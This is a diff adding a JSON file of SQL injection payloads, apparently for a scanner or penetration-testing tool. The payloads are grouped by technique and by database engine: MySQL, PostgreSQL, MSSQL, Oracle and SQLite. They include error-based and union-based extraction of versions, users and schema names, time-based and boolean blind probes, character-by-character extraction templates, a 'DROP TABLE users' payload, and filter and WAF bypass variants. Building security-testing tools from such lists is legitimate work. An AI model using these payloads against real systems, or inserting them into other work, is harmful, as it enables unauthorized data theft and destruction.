@@ -1,0 +1,198 @@
+{
+  "error_based": {
+    "mysql": [
+      "'",
+      "''",
+      "')",
+      "';",
+      "' OR '1'='1",
+      "' OR 1=1--",
+      "' UNION SELECT NULL--",
+      "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
+      "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+      "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
+      "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT schema_name FROM information_schema.schemata LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+    ],
+    "postgresql": [
+      "'",
+      "''",
+      "' OR '1'='1'--",
+      "' OR 1=1--",
+      "' UNION SELECT NULL--",
+      "' AND CAST((SELECT version()) AS int)--",
+      "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+    ],
+    "mssql": [
+      "'",
+      "''",
+      "' OR '1'='1'--",
+      "' OR 1=1--",
+      "' UNION SELECT NULL--",
+      "' AND CONVERT(int,(SELECT @@version))--",
+      "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysdatabases WHERE name NOT IN ('master','model','msdb','tempdb')))--"
+    ],
+    "oracle": [
+      "'",
+      "''",
+      "' OR '1'='1'--",
+      "' OR 1=1--",
+      "' UNION SELECT NULL FROM dual--",
+      "' AND CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) IS NOT NULL--",
+      "' AND XMLType(chr(60)||chr(58)||(SELECT banner FROM v$version WHERE rownum=1)||chr(62)) IS NOT NULL--"
+    ],
+    "sqlite": [
+      "'",
+      "''",
+      "' OR '1'='1'--",
+      "' OR 1=1--",
+      "' UNION SELECT NULL--",
+      "' AND CAST((SELECT sqlite_version()) AS int)--"
+    ]
+  },
+  "time_based": {
+    "mysql": [
+      "' AND SLEEP(5)--",
+      "'; SELECT SLEEP(5)--",
+      "' AND (SELECT * FROM (SELECT SLEEP(5))x)--",
+      "' AND BENCHMARK(5000000,MD5(1))--",
+      "' OR SLEEP(5)--",
+      "' AND IF(1=1,SLEEP(5),0)--"
+    ],
+    "postgresql": [
+      "' AND pg_sleep(5)--",
+      "'; SELECT pg_sleep(5)--",
+      "' OR pg_sleep(5)--",
+      "' AND (SELECT pg_sleep(5))--"
+    ],
+    "mssql": [
+      "'; WAITFOR DELAY '00:00:05'--",
+      "' AND (SELECT COUNT(*) FROM sysusers AS sys1, sysusers AS sys2, sysusers AS sys3, sysusers AS sys4, sysusers AS sys5, sysusers AS sys6, sysusers AS sys7, sysusers AS sys8)--",
+      "'; IF (1=1) WAITFOR DELAY '00:00:05'--"
+    ],
+    "oracle": [
+      "' AND (SELECT COUNT(*) FROM all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)>0--",
+      "'; SELECT DBMS_LOCK.SLEEP(5) FROM dual--"
+    ]
+  },
+  "union_based": {
+    "generic": [
+      "' UNION SELECT 1,2,3--",
+      "' UNION SELECT NULL,NULL,NULL--",
+      "' UNION ALL SELECT 1,2,3--",
+      "' UNION SELECT 1,2,3,4--",
+      "' UNION SELECT NULL,NULL,NULL,NULL--",
+      "' UNION SELECT 1,2,3,4,5--",
+      "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
+      "' ORDER BY 1--",
+      "' ORDER BY 2--",
+      "' ORDER BY 3--",
+      "' ORDER BY 4--",
+      "' ORDER BY 5--"
+    ],
+    "mysql": [
+      "' UNION SELECT user(),database(),version()--",
+      "' UNION SELECT table_name FROM information_schema.tables--",
+      "' UNION SELECT column_name FROM information_schema.columns--",
+      "' UNION SELECT schema_name FROM information_schema.schemata--",
+      "' UNION SELECT concat(user(),0x3a,database(),0x3a,version())--"
+    ],
+    "postgresql": [
+      "' UNION SELECT current_user,current_database(),version()--",
+      "' UNION SELECT table_name FROM information_schema.tables--",
+      "' UNION SELECT column_name FROM information_schema.columns--"
+    ],
+    "mssql": [
+      "' UNION SELECT system_user,db_name(),@@version--",
+      "' UNION SELECT name FROM sysdatabases--",
+      "' UNION SELECT name FROM syscolumns--"
+    ]
+  },
+  "boolean_based": {
+    "generic": [
+      "' AND 1=1--",
+      "' AND 1=2--",
+      "' AND 'a'='a'--",
+      "' AND 'a'='b'--",
+      "' OR 1=1--",
+      "' OR 1=2--",
+      "' AND true--",
+      "' AND false--",
+      "' AND EXISTS(SELECT 1)--",
+      "' AND NOT EXISTS(SELECT 1)--"
+    ],
+    "mysql": [
+      "' AND EXISTS(SELECT * FROM information_schema.tables)--",
+      "' AND EXISTS(SELECT * FROM mysql.user)--",
+      "' AND LENGTH(database())>0--",
+      "' AND ASCII(SUBSTRING(database(),1,1))>64--"
+    ],
+    "postgresql": [
+      "' AND EXISTS(SELECT * FROM information_schema.tables)--",
+      "' AND LENGTH(current_database())>0--",
+      "' AND ASCII(SUBSTRING(current_database(),1,1))>64--"
+    ],
+    "mssql": [
+      "' AND EXISTS(SELECT * FROM sysdatabases)--",
+      "' AND LEN(db_name())>0--",
+      "' AND ASCII(SUBSTRING(db_name(),1,1))>64--"
+    ]
+  },
+  "blind_extraction": {
+    "mysql": [
+      "' AND ASCII(SUBSTRING((SELECT database()),{pos},1))={char}--",
+      "' AND ASCII(SUBSTRING((SELECT user()),{pos},1))={char}--",
+      "' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),{pos},1))={char}--",
+      "' AND LENGTH((SELECT database()))={length}--"
+    ],
+    "postgresql": [
+      "' AND ASCII(SUBSTRING((SELECT current_database()),{pos},1))={char}--",
+      "' AND ASCII(SUBSTRING((SELECT current_user),{pos},1))={char}--",
+      "' AND LENGTH((SELECT current_database()))={length}--"
+    ],
+    "mssql": [
+      "' AND ASCII(SUBSTRING((SELECT db_name()),{pos},1))={char}--",
+      "' AND ASCII(SUBSTRING((SELECT system_user),{pos},1))={char}--",
+      "' AND LEN((SELECT db_name()))={length}--"
+    ]
+  },
+  "second_order": [
+    "admin'/*",
+    "admin'#",
+    "admin'--",
+    "admin' OR 1=1#",
+    "admin' OR 1=1--",
+    "admin' UNION SELECT 1,2,3#",
+    "admin'; DROP TABLE users--"
+  ],
+  "bypass_filters": [
+    "1' AND '1'='1",
+    "1' /*comment*/ AND /*comment*/ '1'='1",
+    "1' /*!AND*/ '1'='1",
+    "1' %41%4e%44 '1'='1",
+    "1' UnIoN SeLeCt 1,2,3--",
+    "1' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--",
+    "1' +UnIoN+SeLeCt+ 1,2,3--",
+    "1'/**/UnIoN/**/SeLeCt/**/1,2,3--",
+    "1' and 1=1 and ''='",
+    "1' and 1=1 and '1'like'1",
+    "1' and 1=1 and '1'='1' --",
+    "1' and 1=1 and '1'='1' #",
+    "1' and 1=1 and char(39)=char(39)",
+    "1' and 1=1 and 0x31=0x31"
+  ],
+  "waf_bypass": [
+    "1' /*!UNION*/ /*!SELECT*/ 1,2,3--",
+    "1' UNION/**/SELECT/**/1,2,3--",
+    "1' %55nion %53elect 1,2,3--",
+    "1' /**/UNION/**/*/*/SELECT/**/ 1,2,3--",
+    "1' +'UNI'+'ON' 'SEL'+'ECT' 1,2,3--",
+    "1' /*!12345UNION SELECT*/ 1,2,3--",
+    "1' UNION(SELECT(1),(2),(3))--",
+    "1' and(select*from(select+sleep(2)union+select+1)a)=1 --",
+    "1' %2f**%2funion%2f**%2fselect 1,2,3--",
+    "1' union distinctrow select 1,2,3--",
+    "1' union all select 1,2,3--",
+    "1' union select all 1,2,3--",
+    "1' /*!UNION ALL*/ /*!SELECT*/ 1,2,3--"
+  ]
+}
